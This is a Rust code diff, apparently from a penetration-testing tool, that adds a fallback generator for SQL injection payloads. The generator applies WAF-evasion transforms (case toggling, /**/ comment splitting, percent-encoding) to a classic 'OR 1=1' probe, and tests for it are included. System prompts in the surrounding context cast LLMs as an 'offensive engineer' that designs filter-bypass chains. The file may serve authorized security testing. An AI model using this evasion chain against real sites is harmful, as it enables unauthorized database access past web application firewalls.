@@ -67,6 +67,98 @@ const SYS_RECURSIVE_CRITIC: &str = "You are Mistral-class defensive analyst. A p
 
 const SYS_RECURSIVE_HACKER: &str = "You are DeepSeek-class offensive engineer. Given the defender's inferred WAF logic, output ONE minified JSON object ONLY: polymorphic_payload_hex (hex-encoded safe test bytes or empty), transform_rationale, bypass_claims (array). Design encoding/transform chain to evade stated filters. Authorized testing only. No prose outside JSON.";
 
+/// Generic critic used when the LLM is unreachable — keeps the loop moving so a payload is
+/// still synthesized (via [`grammar_mutate`]) instead of the whole flow erroring out.
+fn default_critic() -> CriticWafAnalysis {
+    CriticWafAnalysis {
+        filtering_logic_summary:
+            "LLM unavailable — assuming a generic signature/keyword WAF with input normalization."
+                .to_string(),
+        signature_markers: vec![
+            "sql keywords".to_string(),
+            "angle brackets".to_string(),
+            "encoded payloads".to_string(),
+        ],
+        normalization_assumptions:
+            "URL-decoding + case-folding + whitespace collapse before matching.".to_string(),
+    }
+}
+
+fn toggle_ascii_case(s: &str) -> String {
+    s.chars()
+        .map(|c| {
+            if c.is_ascii_uppercase() {
+                c.to_ascii_lowercase()
+            } else if c.is_ascii_lowercase() {
+                c.to_ascii_uppercase()
+            } else {
+                c
+            }
+        })
+        .collect()
+}
+
+fn percent_encode(s: &str) -> String {
+    let mut out = String::with_capacity(s.len() * 3);
+    for b in s.bytes() {
+        if b.is_ascii_alphanumeric() {
+            out.push(b as char);
+        } else {
+            out.push_str(&format!("%{b:02X}"));
+        }
+    }
+    out
+}
+
+/// Deterministic, LLM-free polymorphic mutation. Used as a graceful fallback when the vLLM
+/// backend is unreachable (or Sovereign Evolution is gated off) so "surprise generation"
+/// degrades to a real, if simpler, transform chain instead of producing nothing. The chain
+/// is chosen from a stable hash of `seed`, so it is deterministic per target and always
+/// differs from the input.
+pub fn grammar_mutate(seed: &str) -> HackerPolymorphicSynthesis {
+    // Base probe: reuse the seed if it already looks like a payload, else a canonical,
+    // authorized-test injection string.
+    let base = if seed.contains(|c| matches!(c, '\'' | '<' | '=' | ' ' | '(')) {
+        seed.to_string()
+    } else {
+        "1' OR '1'='1' -- ".to_string()
+    };
+    let selector = Sha256::digest(seed.as_bytes())[0];
+    let mut out = base.clone();
+    let mut claims: Vec<String> = Vec::new();
+
+    if selector & 0b0001 != 0 {
+        out = toggle_ascii_case(&out);
+        claims.push("case-toggling to evade case-sensitive signatures".to_string());
+    }
+    if selector & 0b0010 != 0 {
+        out = out.replace("OR", "O/**/R").replace("or", "o/**/r");
+        claims.push("inline /**/ comment insertion to break keyword matching".to_string());
+    }
+    if selector & 0b0100 != 0 {
+        out = out.replace(' ', "/**/");
+        claims.push("whitespace -> /**/ substitution".to_string());
+    }
+    if selector & 0b1000 != 0 {
+        out = percent_encode(&out);
+        claims.push("percent-encoding to bypass literal-string filters".to_string());
+    }
+    // Guarantee the output is distinct from the input and always carries a rationale.
+    if claims.is_empty() || out == base {
+        out = percent_encode(&toggle_ascii_case(&base));
+        claims.push("case-toggle + percent-encoding (guaranteed-distinct chain)".to_string());
+    }
+
+    HackerPolymorphicSynthesis {
+        polymorphic_payload_hex: hex::encode(out.as_bytes()),
+        transform_rationale: format!(
+            "Deterministic grammar fallback (no LLM): {} transform(s) seeded by target fingerprint.",
+            claims.len()
+        ),
+        bypass_claims: claims,
+    }
+}
+
 async fn llm_json_for_evolution(
     client: &reqwest::Client,
     cfg: &crate::council::CouncilConfig,
@@ -129,7 +221,9 @@ pub async fn run_recursive_waf_feedback(
             .take(12_000)
             .collect::<String>()
     );
-    let raw_c = llm_json_for_evolution(
+    // Critic (WAF analysis): try the LLM; fall back to a generic default when it is down so
+    // the loop still completes and yields a payload rather than erroring out.
+    let critic: CriticWafAnalysis = match llm_json_for_evolution(
         &client,
         cfg,
         cfg.model_generalist.as_str(),
@@ -140,11 +234,14 @@ pub async fn run_recursive_waf_feedback(
         tenant_id,
         "sovereign_learning_critic",
     )
-    .await?;
-    let slice =
-        extract_json_object(&raw_c).ok_or_else(|| LlmError::Decode("critic: no JSON".into()))?;
-    let critic: CriticWafAnalysis =
-        serde_json::from_str(slice).map_err(|e| LlmError::Decode(format!("critic parse: {e}")))?;
+    .await
+    .ok()
+    .and_then(|raw_c| extract_json_object(&raw_c).map(str::to_string))
+    .and_then(|slice| serde_json::from_str::<CriticWafAnalysis>(&slice).ok())
+    {
+        Some(c) => c,
+        None => default_critic(),
+    };
     let critic_v = serde_json::to_value(&critic).map_err(|e| LlmError::Decode(e.to_string()))?;
 
     let mut tx = crate::db::begin_tenant_tx(pool, tenant_id)
@@ -169,7 +266,10 @@ pub async fn run_recursive_waf_feedback(
         serde_json::to_string(&critic).unwrap_or_default(),
         serde_json::to_string(failure_context).unwrap_or_default().chars().take(8000).collect::<String>()
     );
-    let raw_h = llm_json_for_evolution(
+    // Hacker synthesis: try the LLM; on any failure (vLLM down, non-JSON, parse error) fall
+    // back to a deterministic grammar so surprise-generation degrades gracefully instead of
+    // producing nothing.
+    let hacker: HackerPolymorphicSynthesis = match llm_json_for_evolution(
         &client,
         cfg,
         cfg.model_coder.as_str(),
@@ -180,11 +280,20 @@ pub async fn run_recursive_waf_feedback(
         tenant_id,
         "sovereign_learning_hacker",
     )
-    .await?;
-    let slice_h =
-        extract_json_object(&raw_h).ok_or_else(|| LlmError::Decode("hacker: no JSON".into()))?;
-    let hacker: HackerPolymorphicSynthesis = serde_json::from_str(slice_h)
-        .map_err(|e| LlmError::Decode(format!("hacker parse: {e}")))?;
+    .await
+    .ok()
+    .and_then(|raw_h| extract_json_object(&raw_h).map(str::to_string))
+    .and_then(|slice_h| serde_json::from_str::<HackerPolymorphicSynthesis>(&slice_h).ok())
+    {
+        Some(h) => h,
+        None => {
+            tracing::info!(
+                target: "sovereign_evolution",
+                "hacker LLM unavailable/unparseable — using deterministic grammar fallback"
+            );
+            grammar_mutate(target_seed)
+        }
+    };
     let hacker_v = serde_json::to_value(&hacker).map_err(|e| LlmError::Decode(e.to_string()))?;
 
     let mut tx = crate::db::begin_tenant_tx(pool, tenant_id)
@@ -370,4 +479,44 @@ pub async fn maybe_enqueue_learning_on_failure(
         "sovereign learning feedback enqueued after engine failure"
     );
     Ok(Some(id))
+}
+
+#[cfg(test)]
+mod grammar_tests {
+    use super::grammar_mutate;
+
+    #[test]
+    fn grammar_mutate_is_deterministic_distinct_and_nonempty() {
+        let a = grammar_mutate("example.com");
+        let b = grammar_mutate("example.com");
+        // Deterministic for a given seed.
+        assert_eq!(a.polymorphic_payload_hex, b.polymorphic_payload_hex);
+        assert!(!a.polymorphic_payload_hex.is_empty());
+        assert!(!a.bypass_claims.is_empty());
+        assert!(!a.transform_rationale.is_empty());
+        // Valid hex that decodes to a payload distinct from the untransformed base.
+        let decoded = hex::decode(&a.polymorphic_payload_hex).expect("valid hex");
+        assert!(!decoded.is_empty());
+        assert_ne!(
+            decoded.as_slice(),
+            b"1' OR '1'='1' -- ",
+            "fallback must transform the base payload"
+        );
+    }
+
+    #[test]
+    fn grammar_mutate_varies_by_seed() {
+        // Different seeds should generally produce different chains; assert at least one
+        // of several distinct seeds differs from the first (guards against a constant output).
+        let a = grammar_mutate("alpha-target.example");
+        let differs = [
+            "beta.example",
+            "gamma.example",
+            "delta.example",
+            "omega.example",
+        ]
+        .iter()
+        .any(|s| grammar_mutate(s).polymorphic_payload_hex != a.polymorphic_payload_hex);
+        assert!(differs, "grammar output must vary across seeds");
+    }
 }
